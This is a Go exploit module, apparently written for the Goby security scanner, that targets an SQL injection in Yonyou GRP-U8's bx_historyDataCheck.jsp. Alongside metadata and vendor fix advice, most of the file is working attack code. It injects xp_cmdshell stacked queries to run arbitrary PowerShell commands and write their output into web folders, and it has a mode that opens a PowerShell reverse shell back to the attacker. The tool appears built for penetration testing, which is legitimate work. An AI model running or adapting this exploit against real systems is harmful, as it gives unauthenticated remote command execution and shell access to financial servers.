package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Yongyou GRP-U8 bx_historyDataCheck.jsp SQL Injection vulnerability",
    "Description": "<p>UFIDA GRP-U8 is a powerful financial management software that can help companies quickly and accurately conduct financial accounting and fund management.</p><p>There is a SQL injection vulnerability in UFIDA GRP-U8 bx_historyDataCheck.jsp. An unauthenticated remote attacker sends malicious packets through this interface to perform SQL injection, leading to sensitive information disclosure or command execution.</p>",
    "Product": "yonyou-GRP-U8",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2023-09-01",
    "PostTime": "2024-01-04",
    "Author": "_白",
    "FofaQuery": "(body=\"GRP-U8\" && body=\"./scripts/cookie.js\") || title=\"GRP-U8\"",
    "GobyQuery": "(body=\"GRP-U8\" && body=\"./scripts/cookie.js\") || title=\"GRP-U8\"",
    "Level": "3",
    "Impact": "<p>There is a SQL injection vulnerability in UFIDA GRP-U8 bx_historyDataCheck.jsp. An unauthenticated remote attacker sends malicious packets through this interface to perform SQL injection, leading to sensitive information disclosure or command execution.</p>",
    "Recommendation": "<p>1. The manufacturer has released a vulnerability fix, please update and upgrade in time: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a>.</p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sqlPoint,reverse,cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.2",
    "Translation": {
        "CN": {
            "Name": "用友 GRP-U8 bx_historyDataCheck.jsp SQL 注入漏洞",
            "Product": "用友-GRP-U8",
            "Description": "<p>用友 GRP-U8 是一款功能强大的财务管理软件,可以帮助企业快速、准确地进行财务核算和资金管理。</p><p>用友 GRP-U8 bx_historyDataCheck.jsp 存在 SQL 注入漏洞。未经身份验证的远程攻击者通过该接口发送恶意数据包执行SQL注入，导致敏感信息泄露或命令执行。</p>",
            "Recommendation": "<p>1、厂商已发布漏洞修复程序，请及时更新升级：<a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a>。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>用友 GRP-U8 bx_historyDataCheck.jsp 存在 SQL 注入漏洞。未经身份验证的远程攻击者通过该接口发送恶意数据包执行SQL注入，导致敏感信息泄露或命令执行。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yongyou GRP-U8 bx_historyDataCheck.jsp SQL Injection vulnerability",
            "Product": "yonyou-GRP-U8",
            "Description": "<p>UFIDA GRP-U8 is a powerful financial management software that can help companies quickly and accurately conduct financial accounting and fund management.</p><p>There is a SQL injection vulnerability in UFIDA GRP-U8 bx_historyDataCheck.jsp. An unauthenticated remote attacker sends malicious packets through this interface to perform SQL injection, leading to sensitive information disclosure or command execution.</p>",
            "Recommendation": "<p>1. The manufacturer has released a vulnerability fix, please update and upgrade in time: <a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a>.</p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>There is a SQL injection vulnerability in UFIDA GRP-U8 bx_historyDataCheck.jsp. An unauthenticated remote attacker sends malicious packets through this interface to perform SQL injection, leading to sensitive information disclosure or command execution.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10905"
}`
	sendPayloadFlagtxjCLHX := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		paylaodConfig := httpclient.NewPostRequestConfig("/u8qx/bx_historyDataCheck.jsp")
		paylaodConfig.VerifyTls = false
		paylaodConfig.FollowRedirect = false
		paylaodConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		paylaodConfig.Data = payload
		return httpclient.DoHttpRequest(hostInfo, paylaodConfig)
	}

	execCmdFlagtxjCLHX := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		filename := goutils.RandomHexString(16) + ".txt"
		//同时检测所有盘的powershell语句在低版本windows运行失败，因此此处仅检测cde三个磁盘，用友大多为d盘
		cmds := []string{`powershell -ExecutionPolicy Bypass -Command "$items = Get-ChildItem -Path \"C:\*\U8\webapps\" -Directory; foreach ($item in $items) { $filePath = Join-Path $item.FullName \"` + filename + `\"; ` + cmd + ` | Out-File -FilePath $filePath }"`, `powershell -ExecutionPolicy Bypass -Command "$items = Get-ChildItem -Path \"D:\*\U8\webapps\" -Directory; foreach ($item in $items) { $filePath = Join-Path $item.FullName \"` + filename + `\"; ` + cmd + ` | Out-File -FilePath $filePath }"`, `powershell -ExecutionPolicy Bypass -Command "$items = Get-ChildItem -Path \"E:\*\U8\webapps\" -Directory; foreach ($item in $items) { $filePath = Join-Path $item.FullName \"` + filename + `\"; ` + cmd + ` | Out-File -FilePath $filePath }"`}
		for _, cmd := range cmds {
			payload := `userName=';exec master..xp_cmdshell "` + cmd + `"--+&class.module.classLoader.DefaultAssertionStatus=`
			resp, err := sendPayloadFlagtxjCLHX(hostInfo, payload)
			if resp == nil && err != nil {
				return nil, err
			}
		}
		resultConfig := httpclient.NewGetRequestConfig("/" + filename)
		resultConfig.VerifyTls = false
		resultConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, resultConfig)
	}

	checkSQLFlagtxjCLHX := func(hostInfo *httpclient.FixUrl) (bool, error) {
		resp, err := sendPayloadFlagtxjCLHX(hostInfo, "userName='&class.module.classLoader.DefaultAssertionStatus=")
		if resp == nil && err != nil {
			return false, err
		} else {
			resp.Utf8Html = strings.ReplaceAll(resp.Utf8Html, "\r", "")
			resp.Utf8Html = strings.ReplaceAll(resp.Utf8Html, "\n", "")
			if "" != resp.Utf8Html {
				return false, errors.New("漏洞不存在")
			}
		}
		resp, err = sendPayloadFlagtxjCLHX(hostInfo, "userName='--+&class.module.classLoader.DefaultAssertionStatus=")
		if resp == nil && err != nil {
			return false, err
		} else {
			resp.Utf8Html = strings.ReplaceAll(resp.Utf8Html, "\r", "")
			resp.Utf8Html = strings.ReplaceAll(resp.Utf8Html, "\n", "")
			if "0" == resp.Utf8Html {
				return true, errors.New("漏洞不存在")
			}
		}
		return false, errors.New("漏洞不存在")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			success, _ := checkSQLFlagtxjCLHX(hostInfo)
			return success
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "sqlPoint" {
				if success, err := checkSQLFlagtxjCLHX(expResult.HostInfo); success {
					expResult.Success = true
					expResult.Output = `POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 59
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

userName='&class.module.classLoader.DefaultAssertionStatus=`
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_windows", waitSessionCh)
				//rp就是拿到的监听端口
				if err != nil || len(rp) == 0 {
					expResult.Output = "godclient bind failed!"
					expResult.Success = false
					return expResult
				}
				sendPayloadFlagtxjCLHX(expResult.HostInfo, `userName=';exec master..xp_cmdshell "`+godclient.ReverseTCPByPowershell(rp)+`"--+&class.module.classLoader.DefaultAssertionStatus=`)
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败! 用户权限不足或被拦截,请尝试手动利用时间盲注"
				}
			} else if attackType == "cmd" {
				cmd := goutils.B2S(stepLogs.Params["cmd"])
				if resp, err := execCmdFlagtxjCLHX(expResult.HostInfo, cmd); resp != nil && resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = "漏洞利用失败! 用户权限不足或windows系统版本过低,请尝试手动利用时间盲注"
					expResult.Success = false
				}
			}
			return expResult
		},
	))
}
